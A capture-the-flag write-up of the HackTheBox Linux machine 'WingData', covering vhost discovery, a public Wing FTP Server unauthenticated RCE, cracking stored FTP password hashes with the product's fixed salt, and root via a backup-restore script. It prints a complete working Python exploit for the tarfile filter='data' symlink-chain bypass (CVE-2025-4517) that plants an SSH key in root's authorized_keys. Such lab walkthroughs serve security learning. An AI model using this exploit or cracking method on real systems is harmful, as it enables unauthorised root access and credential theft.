---
title: HackTheBox - WingData
date: 2026-10-27
image: cover.png
tags: [HackTheBox, Easy, Linux]
platform: HackTheBox
os: Linux
difficulty: Easy
points: 45
released: 2026-02-14
ip: 10.129.244.106
boxAvatar: htb-cover.png
excerpt: An easy Linux box fronting a file-sharing company's site. A vhost scan turns up a Wing FTP Server instance vulnerable to a known unauthenticated RCE, which gives a low-privileged shell and access to the server's stored user password hashes. One cracks, giving SSH access to a real account that can run a backup-restore script as root. The script's tar extraction uses Python's "safe" filter="data" mode, but a since-patched Python tarfile bug (CVE-2025-4517) lets a chain of nested symlinks escape the staging directory anyway, landing a root SSH key and full root.
---

# WingData

WingData is an easy-rated Linux machine built around "Wing Data Solutions," a fictional encrypted file-sharing company. The front-end site itself is a dead end, but a vhost scan uncovers a Wing FTP Server instance running a version with a public unauthenticated RCE. That foothold exposes locally stored password hashes, one of which cracks and grants SSH access to a real account - one with sudo rights to a backup-restore script that turns out to be vulnerable to a tar-extraction path-traversal bug, patched in Python only months before this box's release. Every credential, hash, and IP below belongs to the lab and has no meaning outside of it.

### NMAP Scanning

```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey:
|   256 a1:fa:95:8b:d7:56:03:85:e4:45:c9:c7:1e:ba:28:3b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBL+8LZAmzRfTy+4t8PJxEvRWhPho8aZj9ImxRfWn9TKepkxh8pAF3WDu55pd/gaSUGIo9cuOvv+3r6w7IuCpqI4=
|   256 9c:ba:21:1a:97:2f:3a:64:73:c1:4c:1d:ce:65:7a:2f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFFmcxflCAAe4LPgkg7hOxJen41bu6zaE/y08UnA4oRp
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.66
|_http-title: WingData Solutions
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.66 (Debian)
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### SSH - Banner Grabbing

```bash
➜  wingdata nc -vn 10.129.244.106 22
(UNKNOWN) [10.129.244.106] 22 (ssh) open
SSH-2.0-OpenSSH_9.2p1 Debian-2+deb12u7
```

### Web Server Enumeration

The site redirects to `wingdata.htb`, so we add it to `/etc/hosts`:

```bash
➜  wingdata cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	kali
::1		localhost ip6-localhost ip6-loopback
ff02::1		ip6-allnodes
ff02::2		ip6-allrouters

10.129.244.106	wingdata.htb
```

{% image %}

`whatweb` confirms the server is Apache 2.4.66 - not an attack vector on its own, but worth mapping before going further:

{% image2 %}

A `feroxbuster` scan against it doesn't turn up anything interesting:

{% image3 %}

With no leads on the main vhost, we run a vhost enumeration scan instead:

```bash
ffuf -u http://wingdata.htb/ -H 'Host: FUZZ.wingdata.htb' -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --fw 21
```

{% image4 %}

That finds `ftp`, which we add to `/etc/hosts` as well:

```bash
➜  wingdata cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	kali
::1		localhost ip6-localhost ip6-loopback
ff02::1		ip6-allnodes
ff02::2		ip6-allrouters

10.129.244.106	wingdata.htb ftp.wingdata.htb
```

### FTP - Wing FTP Server

`ftp.wingdata.htb` serves the login page for **Wing FTP Server v7.4.3**:

{% image5 %}

That version has a known unauthenticated remote code execution vulnerability, with a public exploit available on [Exploit-DB #52347](https://www.exploit-db.com/exploits/52347). Running it with a simple `whoami` confirms code execution as the `wingftp` service account:

{% image6 %}

From there we drop a reverse shell script, serve it over a local HTTP listener, and trigger the RCE again to fetch and execute it:

{% image7 %}

### Pillaging and Situational Awareness

`/opt/wftpserver/Data/1/users` holds five configured FTP users, each with a stored password hash we can try to crack:

{% image8 %}

```bash
➜  wingdata cat hashes.hash
d67f86152e5c4df1b0ac4a18d3ca4a89c1b12e6b748ed71d01aeb92341927bca
c1f14672feec3bba27231048271fcdcddeb9d75ef79f6889139aa78c9d398f10
a70221f33a51dca76dfd46c17ab17116a97823caf40aeecfbc611cae47421b03
5916c7481fa2f20bd86f4bdb900f0342359ec19a77b7e3ae118f3b5d0d3334ca
32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca
```

Wing FTP Server's documentation describes its password hashing as SHA-256 over `password + salt`, with a fixed, publicly known salt of `WingFTP`. Hashcat expects `hash:salt` pairs, so we reformat the list accordingly:

```bash
d67f86152e5c4df1b0ac4a18d3ca4a89c1b12e6b748ed71d01aeb92341927bca:WingFTP
c1f14672feec3bba27231048271fcdcddeb9d75ef79f6889139aa78c9d398f10:WingFTP
a70221f33a51dca76dfd46c17ab17116a97823caf40aeecfbc611cae47421b03:WingFTP
5916c7481fa2f20bd86f4bdb900f0342359ec19a77b7e3ae118f3b5d0d3334ca:WingFTP
32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP
```

One of the five cracks:

{% image9 %}

That password gets us a direct SSH login as the user `wacky`:

{% image10 %}

### Privilege Escalation

Enumeration as `wacky` turns up sudo rights to run a specific backup-restore script as root. The script takes two arguments - a backup filename and a restore-directory name - and validates both with a regex: the backup file must match `backup_<integer>.tar`, and the restore directory must start with `restore_` followed by an alphanumeric tag. Once validated, it resolves the backup's path under `/opt/backup_clients/backups/` and extracts it into a staging directory under `/opt/backup_clients/restored_backups/`, using Python's `tarfile` module with `filter="data"`.

The input validation is strict, but the interesting detail is in the extraction step itself. `filter="data"` is meant to be a safer extraction mode that restricts path traversal - but since this script runs as root, it's worth checking exactly which Python build is enforcing that filter:

```bash
/usr/local/bin/python3 --version
```

{% image11 %}

That version is affected by `CVE-2025-4517`, a path-traversal bug in `tarfile`'s `filter="data"` protection. A public proof of concept is available from Google's security research team: [GHSA-hgqp-3mmf-7h8f](https://github.com/google/security-research/security/advisories/GHSA-hgqp-3mmf-7h8f). We use it to craft a malicious archive, `backup_2.tar`, that satisfies the script's naming check while injecting our own SSH public key:

```python
# script.py
import tarfile
import os
import io
import sys

pubkey = b"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKv4AVZaOzUzBGbhvJqU5CQ6fNGRl67v/AYiiIq8WTv7 kali@kali\n"

comp = 'd' * (55 if sys.platform == 'darwin' else 247)
steps = "abcdefghijklmnop"
path = ""

with tarfile.open("backup_2.tar", "x") as tar:
    for i in steps:
        a = tarfile.TarInfo(os.path.join(path, comp))
        a.type = tarfile.DIRTYPE
        tar.addfile(a)

        b = tarfile.TarInfo(os.path.join(path, i))
        b.type = tarfile.SYMTYPE
        b.linkname = comp
        tar.addfile(b)

        path = os.path.join(path, comp)

    linkpath = os.path.join("/".join(steps), "l" * 254)
    l = tarfile.TarInfo(linkpath)
    l.type = tarfile.SYMTYPE
    l.linkname = "../" * len(steps)
    tar.addfile(l)

    e = tarfile.TarInfo("escape")
    e.type = tarfile.SYMTYPE
    e.linkname = linkpath + "/../../../../root/.ssh/authorized_keys"
    tar.addfile(e)

    f = tarfile.TarInfo("inject")
    f.type = tarfile.LNKTYPE
    f.linkname = "escape"
    tar.addfile(f)

    c = tarfile.TarInfo("inject")
    c.type = tarfile.REGTYPE
    c.size = len(pubkey)
    tar.addfile(c, fileobj=io.BytesIO(pubkey))
```

The archive builds a chain of nested symlinks deep enough to exceed the depth that `filter="data"` tracks, then redirects a final hardlink write through that chain to land outside the staging directory entirely, at `/root/.ssh/authorized_keys`. We generate the archive and invoke the restore script with sudo to trigger the extraction:

```bash
wacky@wingdata:/opt/backup_clients/backups$ python3 script.py
wacky@wingdata:/opt/backup_clients/backups$ sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup_2.tar --restore-dir restore_1
[+] Backup: backup_2.tar
[+] Staging directory: /opt/backup_clients/restored_backups/restore_1
[+] Extraction completed in /opt/backup_clients/restored_backups/restore_1
```

The extraction succeeds, and our public key lands in `/root/.ssh/authorized_keys`. We log in directly as root over SSH, no password required:

```bash
$ ssh root@10.129.244.106
Linux wingdata 6.1.0-42-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.159-1 (2025-12-30) x86_64

root@wingdata:~# id
uid=0(root) gid=0(root) groups=0(root)
```

WingData pairs a well-known FTP server RCE with a much more recent find: a path-traversal bypass in the extraction filter Python itself introduced to prevent exactly this class of attack. It's a reminder that "safe by default" extraction logic is still just logic - and that a security control shipped by the standard library deserves the same scrutiny as anything else running as root.
